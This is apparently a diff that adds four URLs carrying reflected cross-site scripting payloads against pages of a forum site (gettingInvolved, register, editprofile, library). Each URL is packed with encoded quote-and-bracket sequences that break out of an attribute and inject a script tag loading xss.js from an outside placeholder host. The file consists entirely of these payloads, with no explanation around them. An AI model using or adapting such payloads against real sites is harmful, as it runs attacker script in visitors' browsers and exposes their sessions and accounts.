@@ -1,0 +1,4 @@
+http://www.example.net/gettingInvolved.html?s=&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&quot;
+http://www.example.net/forums/register.php?s=\\&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&quot;&amp;action=signup
+http://www.example.net/forums/member.php?action=editprofile&amp;s=&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&#039;&gt;&#039;&gt;&#039;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&#039;&lt;&#039;
+http://www.example.net/library/index.html?s=questions&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&quot;&gt;&lt;SCRIPT%20SRC=http://www.example.com/xss.js&gt;&lt;/SCRIPT&gt;&lt;&quot;&lt;&quot;&lt;&quot;&lt;&quot;
